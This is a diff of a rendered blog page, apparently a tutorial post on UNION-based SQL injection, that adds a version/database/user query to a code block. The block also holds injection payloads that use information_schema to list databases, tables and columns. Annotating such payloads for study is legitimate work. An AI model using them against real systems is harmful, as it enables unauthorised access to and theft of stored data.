@@ -299,7 +299,7 @@
 
       
         
-          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and 0 union select(select group_concat(schema_name) from information_schema.schemata),2-49;//查出所有库的名字</span><br><span class="line">and 0 union select(select group_concat(table_name) from information_schema.tables where table_schema =&apos;test&apos;),2-49;//查出所有表的名字</span><br><span class="line">and 0 union select(select group_concat(schema_name) from information_schema.columns where table_schema=&apos;test&apos; and table_name=&apos;users&apos; ),2-49;//查出所有列的名字</span><br></pre></td></tr></table></figure>
+          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">and 0 union select version(),database(),user(),4-49;//显示版本号 当前数据 用户名</span><br><span class="line">and 0 union select(select group_concat(schema_name) from information_schema.schemata),2-49;//查出所有库的名字</span><br><span class="line">and 0 union select(select group_concat(table_name) from information_schema.tables where table_schema =&apos;test&apos;),2-49;//查出所有表的名字</span><br><span class="line">and 0 union select(select group_concat(schema_name) from information_schema.columns where table_schema=&apos;test&apos; and table_name=&apos;users&apos; ),2-49;//查出所有列的名字</span><br></pre></td></tr></table></figure>
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2019/08/14/union-select/#more" rel="contents">
